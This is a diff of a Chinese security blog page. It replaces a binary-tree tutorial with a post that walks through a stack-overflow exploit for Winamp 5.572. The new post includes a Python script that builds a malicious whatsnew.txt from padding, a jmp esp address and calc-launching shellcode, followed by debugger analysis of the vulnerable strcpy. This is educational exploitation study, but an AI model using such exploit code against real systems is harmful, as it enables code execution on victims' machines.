@@ -6,27 +6,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hello! CytQ">
-    <title>二叉树 - Hello! CytQ</title>
+    <title>通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用 - Hello! CytQ</title>
     <meta name="author" content="CytQ">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <meta name="description" content="二叉树， 二叉查找树，二分查找算法">
-<meta name="keywords" content="算法">
+    <meta name="description" content="光说不练假把式，从现在开始会写一些漏洞的利用 第一篇文章会从POC的角度分析漏洞并利用。 Target：Winamp  Version：5.572 Detail: Stack overflow">
+<meta name="keywords" content="漏洞,通关,专栏">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="二叉树">
-<meta property="og:url" content="http://imlzq.com/2016/03/15/二叉树/index.html">
+<meta property="og:title" content="通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用">
+<meta property="og:url" content="http://imlzq.com/2018/08/14/stackoverflow_winamp5572/index.html">
 <meta property="og:site_name" content="Hello! CytQ">
-<meta property="og:description" content="二叉树， 二叉查找树，二分查找算法">
+<meta property="og:description" content="光说不练假把式，从现在开始会写一些漏洞的利用 第一篇文章会从POC的角度分析漏洞并利用。 Target：Winamp  Version：5.572 Detail: Stack overflow">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://img.blog.csdn.net/20160315125814600">
-<meta property="og:updated_time" content="2018-04-06T16:03:21.648Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_origin.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_hacked.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_all_txt.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_txt1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_text2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_malloc.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcmp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcpy.png">
+<meta property="og:updated_time" content="2018-08-31T09:07:35.591Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="二叉树">
-<meta name="twitter:description" content="二叉树， 二叉查找树，二分查找算法">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20160315125814600">
+<meta name="twitter:title" content="通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用">
+<meta name="twitter:description" content="光说不练假把式，从现在开始会写一些漏洞的利用 第一篇文章会从POC的角度分析漏洞并利用。 Target：Winamp  Version：5.572 Detail: Stack overflow">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_origin.png">
     
     
         
@@ -203,14 +210,14 @@
         <div class="post-header main-content-wrap text-left">
     
         <h1 class="post-title" itemprop="headline">
-            二叉树
+            通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用
         </h1>
     
     
         <div class="post-meta">
-    <time itemprop="datePublished" datetime="2016-03-15T13:05:35+08:00">
+    <time itemprop="datePublished" datetime="2018-08-14T22:34:00+08:00">
 	
-		    Mar 15, 2016
+		    Aug 14, 2018
     	
     </time>
     
@@ -221,47 +228,34 @@
     
     <div class="post-content markdown" itemprop="articleBody">
         <div class="main-content-wrap">
-            <p>二叉树， 二叉查找树，二分查找算法</p>
+            <p>光说不练假把式，从现在开始会写一些漏洞的利用</p>
+<p>第一篇文章会从POC的角度分析漏洞并利用。</p>
+<p>Target：Winamp </p>
+<p>Version：5.572</p>
+<p>Detail: Stack overflow</p>
 <a id="more"></a>    
-<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>二叉树跟树有区别，最大的一点就是：树的度没有限制，而二叉树最多则不能超过２个度</p>
-<p><strong>基础</strong></p>
-<p>二叉树由结点组成，结点包含的链接可以为空( null)或者指向其他结点，在二叉树中，每个结点只能有一个父结点(只有根节点例外)，　而且每个结点都只有左右两个链接，分别指向他们自己的左子节点和右子节点。</p>
-<p><strong>类型</strong></p>
-<ul>
-<li>完全二叉树：若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树。</li>
-<li>满二叉树：除了叶结点外每一个结点都有左右子叶且叶子结点都处在最底层的二叉树。</li>
-<li>平衡二叉树：平衡二叉树又被称为AVL树（区别于AVL算法），它是一棵二叉排序树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。</li>
-</ul>
-<p><strong>二叉排序树</strong></p>
-<p>二叉排序树又称为二叉查找树，它的一个显著特点是：它的每个结点都含有一个Comparable的键(以及相关联的值）。如果根节点存在左右节点，那么根节点的值一定比右节点小，比左节点大。<br>在二分查找树中，每个结点还包含了一个键和一个值。<br>从这里我们也可以看出二叉排序树的一个很好的优点就是它能够保持键的有序性，因此它可以作为实现有序符号表中众多方法的基础。<br>而根据它的这个特性，就可以归纳出一个二叉查找树的查找方法：二分查找树。<br>接下来，就先归纳二分查找法，之后再平缓过度到二分查找树的查找中。</p>
-<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p>二分查找是一种查找效率较高的方法，但是对于被查找的数据有一定的先决条件：被查找的数据需要是有序的，即从从小到大或从大到小排列。</p>
-<p>不足：查询快，但是插入和删除信息较慢</p>
-<p><strong>二分查找（Binary Search）思路</strong><br>先确定待查记录所在的区间，然后逐步缩小区间直到找到或找不到该记录为止。</p>
-<p><strong>具体过程</strong></p>
-<ol>
-<li>先将关键字与 mid 指向的元素比较，如果相等则返回mid。</li>
-<li>关键字小于 mid 指向的元素关键字，mid –, 在 [ low,  mid ]区间中继续进行二分查找。 </li>
-<li>关键字大于mid 指向的元素关键字，mid ++, 在[ mid, high] 区间中继续进行二分查找。</li>
-</ol>
-<p><strong>代码</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二分查找返回待查元素的数组下标  </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search_Binary</span><span class="params">(STable st, KeyType key)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">int</span> high = st.length - <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)&#123;  </span><br><span class="line">        <span class="keyword">int</span> mid = (low + high)/<span class="number">2</span>;  </span><br><span class="line">        <span class="keyword">if</span>( key == st.elem[mid].key) &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(key &lt; st.elem[mid].key) &#123; </span><br><span class="line">            high = mid - <span class="number">1</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">	        low = mid + <span class="number">1</span>;</span><br><span class="line">	    &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="二叉查找树的使用"><a href="#二叉查找树的使用" class="headerlink" title="二叉查找树的使用"></a>二叉查找树的使用</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Value <span class="built_in">get</span>(Key <span class="built_in">key</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">get</span>(root, <span class="built_in">key</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Value <span class="built_in">get</span>(Node x,Key <span class="built_in">key</span>) &#123;</span><br><span class="line">        <span class="comment">// 在以x为根结点的子树中查找并返回key所对应的值</span></span><br><span class="line">        <span class="comment">//　如果找不到则返回null</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> cmp = <span class="built_in">key</span>.compareTo(x.<span class="built_in">key</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">get</span>(x.left, <span class="built_in">key</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">get</span>(x.right, <span class="built_in">key</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x.val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> put(Key <span class="built_in">key</span>, Value val) &#123;</span><br><span class="line">        <span class="comment">// 查找key,找到则更新它的值，否则为他创建一个新的节点</span></span><br><span class="line">        root = put(root, <span class="built_in">key</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node put(Node x, Key <span class="built_in">key</span>, Value val) &#123;</span><br><span class="line">        <span class="comment">// 如果key存在于以x为根节点的子树中则更新它的值</span></span><br><span class="line">        <span class="comment">//　否则将以key和val为键值对的新节点的新节点插入到该子树中</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node(<span class="built_in">key</span>, val, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> cmp = <span class="built_in">key</span>.compareTo(x.<span class="built_in">key</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            x.left = put(x.left, <span class="built_in">key</span>, val);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            x.right = put(x.right, <span class="built_in">key</span>, val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            x.val = val;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        x.N = <span class="built_in">size</span>(x.left) + <span class="built_in">size</span>(x.right) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>在Node put()方法中，最后一句有个x.N = size(x.left) + size(x.right) + 1,这一句的作用是：<br>size()方法会将空链接的值当做0，这样就能够保证一下的公式对于二叉树的人以节点x总是成立。</p>
-<blockquote>
-<p>size(x) = size(x.left) + size(x.right) + 1</p>
-</blockquote>
-<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>二分查找树的一个更重要的特性就是插入的实现难度和查找差不多，当查找一个不存在于书中的结点并结束于一条空链接时，需要做的就是将链接指向一个含有被查找的键的新节点即可。<br>在上面的代码中，上面代码中的put()方法即是这种功能。</p>
-<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p>二叉树的遍历分为：</p>
-<ul>
-<li>前序遍历：根节点－左子树－右子树</li>
-<li>中序遍历：左子树－根节点－右子树</li>
-<li>后序遍历：左子树－右子树－根节点</li>
-<li>按层遍历：从根节点到下，一层层的从左到右依次遍历</li>
-</ul>
-<p><img src="http://img.blog.csdn.net/20160315125814600" alt=""></p>
-<p>这是我画的一个简单使示例图，照着遍历的方法，结果就为：</p>
-<p>前序遍历：　ABCDEFG<br>中序遍历：　CBDAEGF<br>后序遍历：　CDBGFEA<br>按层遍历：　ABECDFG</p>
-<p>总结到这里，又想起之前发的一篇文章, <a href="http://blog.csdn.net/jonstank2013/article/details/50754834" target="_blank" rel="noopener"> Python学习笔记(四) 多重继承及内部算法解析</a>, 里面也总结了一下深度优先算法，广度优先算法及Python在多重继承同名父类方法选择上的C3算法。这里就不做过多的介绍了，传送门在这。</p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Winamp是一款音乐播放软件，在他的5.572版本中存在一个栈溢出。</p>
+<p><strong>它的表现形式是：</strong></p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_origin.png" alt="Version History"></p>
+<p>当用户点击Help-&gt;Abount winamp-&gt;Version History时会读取whatsnew.txt文件，并将读取到的数据放置到本地的一个数组中，只是这个过程使用了strcpy函数，从而造成缓冲区溢出。</p>
+<p><strong>从网络上得到如下的POC：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里的Shellcode和下方的jmp esp我已修改。calc.exe</span></span><br><span class="line">sc = (<span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span></span><br><span class="line">      <span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line">      <span class="string">"\xDB\x53"</span></span><br><span class="line">      <span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line">      <span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line">      <span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">version = <span class="string">"Winamp 5.572"</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">"\x41"</span> * <span class="number">540</span>          <span class="comment"># Crash</span></span><br><span class="line">rop += <span class="string">"\xed\x1e\x96\x7c"</span>   <span class="comment"># jmp esp</span></span><br><span class="line"><span class="comment">#junk = "\x43" * 800</span></span><br><span class="line">junk = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">tecfile = open(<span class="string">'whatsnew.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">tecfile.write(version + rop + sc + junk)</span><br><span class="line">tecfile.close()</span><br></pre></td></tr></table></figure>
+<p>POC也就是whatsnew.txt，由4部分构成，第一部分是Version，这个在之后会讲到。第二部分时填充缓冲区的A字符，第三部分是jmp esp，第四部分是弹出计算器的Shellcode。</p>
+<h2 id="Attacking"><a href="#Attacking" class="headerlink" title="Attacking"></a>Attacking</h2><p>使用恶意构造的whatsnew.txt替换程序原始的txt文件，重新运行程序，点击Version History，成功溢出。结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_hacked.png" alt="hacked"></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>使用OllyDbg打开winamp.exe，并运行。</p>
+<p>既然程序会读取whatsnew.txt，那么我们就全局搜索这个关键字，看在哪里调用了它。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_all_txt.png" alt="search all"></p>
+<p>上滑到text列表的顶部，右键，选择search text，输入whatsnew.txt</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_txt1.png" alt="search text1"></p>
+<p>能得到如下的两个结果，双击跟进并给他们下断点。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_text2.png" alt="search text2"></p>
+<p>这时候我们点击程序的Version History，发现程序段在了004015B2这个位置，顺着代码继续静态分析。我们能看到程序使用malloc在堆中创建了20000DWROD的空间。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_malloc.png" alt="malloc"></p>
+<p>并使用strncmp比较txt文件中的前9个字节，判断是否是Winamp 5.开头，这也是为什么POC中会存在版本号的原因。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcmp.png" alt="strncmp"></p>
+<p>最后一步就是执行strcpy，这里就不用再介绍啦。</p>
+<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcpy.png" alt="strcpy"></p>
 
             
 
@@ -272,7 +266,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/算法/">算法</a>
+    <a class="tag tag--primary tag--small t-link" href="/tags/专栏/">专栏</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a> <a class="tag tag--primary tag--small t-link" href="/tags/通关/">通关</a>
 
             </div>
         
@@ -282,8 +276,7 @@
         <ul class="post-actions post-action-nav">
             <li class="post-action">
                 
-                    
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/15/子字符串查找算法_归纳及汇总/" data-tooltip="子字符串查找算法_归纳及汇总" aria-label="PREVIOUS: 子字符串查找算法_归纳及汇总">
+                    <a class="post-action-btn btn btn--disabled">
                 
                     <i class="fa fa-angle-left" aria-hidden="true"></i>
                     <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
@@ -292,7 +285,7 @@
             <li class="post-action">
                 
                     
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/14/快速排序_归纳/" data-tooltip="快速排序_归纳" aria-label="NEXT: 快速排序_归纳">
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/08/11/stackoverflow_protection/" data-tooltip="通关栈溢出（四）：缓冲区溢出的防御技术及绕过" aria-label="NEXT: 通关栈溢出（四）：缓冲区溢出的防御技术及绕过">
                 
                     <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                     <i class="fa fa-angle-right" aria-hidden="true"></i>
@@ -310,7 +303,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2016/03/15/二叉树/" title="Share on Weibo">
+                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Weibo">
                     <i class="fa fa-weibo" aria-hidden="true"></i>
                 </a>
             </li>
@@ -318,7 +311,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2016/03/15/二叉树/&amp;title=二叉树" title="Share on QQ">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/&amp;title=通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用" title="Share on QQ">
                     <i class="fa fa-qq" aria-hidden="true"></i>
                 </a>
             </li>
@@ -326,7 +319,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2016/03/15/二叉树/" title="Share on Qzone">
+                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Qzone">
                     <i class="fa fa-star" aria-hidden="true"></i>
                 </a>
             </li>
@@ -334,7 +327,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2016/03/15/二叉树/" title="Share on Renren">
+                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Renren">
                     <i class="fa fa-renren" aria-hidden="true"></i>
                 </a>
             </li>
@@ -384,8 +377,7 @@
         <ul class="post-actions post-action-nav">
             <li class="post-action">
                 
-                    
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/15/子字符串查找算法_归纳及汇总/" data-tooltip="子字符串查找算法_归纳及汇总" aria-label="PREVIOUS: 子字符串查找算法_归纳及汇总">
+                    <a class="post-action-btn btn btn--disabled">
                 
                     <i class="fa fa-angle-left" aria-hidden="true"></i>
                     <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
@@ -394,7 +386,7 @@
             <li class="post-action">
                 
                     
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/14/快速排序_归纳/" data-tooltip="快速排序_归纳" aria-label="NEXT: 快速排序_归纳">
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/08/11/stackoverflow_protection/" data-tooltip="通关栈溢出（四）：缓冲区溢出的防御技术及绕过" aria-label="NEXT: 通关栈溢出（四）：缓冲区溢出的防御技术及绕过">
                 
                     <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                     <i class="fa fa-angle-right" aria-hidden="true"></i>
@@ -412,7 +404,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2016/03/15/二叉树/" title="Share on Weibo">
+                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Weibo">
                     <i class="fa fa-weibo" aria-hidden="true"></i>
                 </a>
             </li>
@@ -420,7 +412,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2016/03/15/二叉树/&amp;title=二叉树" title="Share on QQ">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/&amp;title=通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用" title="Share on QQ">
                     <i class="fa fa-qq" aria-hidden="true"></i>
                 </a>
             </li>
@@ -428,7 +420,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2016/03/15/二叉树/" title="Share on Qzone">
+                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Qzone">
                     <i class="fa fa-star" aria-hidden="true"></i>
                 </a>
             </li>
@@ -436,7 +428,7 @@
             
             
             <li class="post-action hide-xs">
-                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2016/03/15/二叉树/" title="Share on Renren">
+                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/" title="Share on Renren">
                     <i class="fa fa-renren" aria-hidden="true"></i>
                 </a>
             </li>
@@ -469,7 +461,7 @@
             
             
             <li class="share-option">
-                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2016/03/15/二叉树/">
+                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/">
                     <i class="fa fa-weibo" aria-hidden="true"></i><span>Share on Weibo</span>
                 </a>
             </li>
@@ -477,7 +469,7 @@
             
             
             <li class="share-option">
-                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2016/03/15/二叉树/&amp;title=二叉树">
+                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/&amp;title=通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用">
                     <i class="fa fa-qq" aria-hidden="true"></i><span>Share on QQ</span>
                 </a>
             </li>
@@ -485,7 +477,7 @@
             
             
             <li class="share-option">
-                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2016/03/15/二叉树/">
+                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/">
                     <i class="fa fa-star" aria-hidden="true"></i><span>Share on Qzone</span>
                 </a>
             </li>
@@ -493,7 +485,7 @@
             
             
             <li class="share-option">
-                <a class="share-option-btn" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2016/03/15/二叉树/">
+                <a class="share-option-btn" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/14/stackoverflow_winamp5572/">
                     <i class="fa fa-renren" aria-hidden="true"></i><span>Share on Renren</span>
                 </a>
             </li>
@@ -798,7 +790,7 @@
             (function() {
                 function render() {
                     new Gitment({
-                        id: 'http://imlzq.com/2016/03/15/二叉树/',
+                        id: 'http://imlzq.com/2018/08/14/stackoverflow_winamp5572/',
                         owner: 'CytQ',
                         repo: 'BlogComments',
                         oauth: {
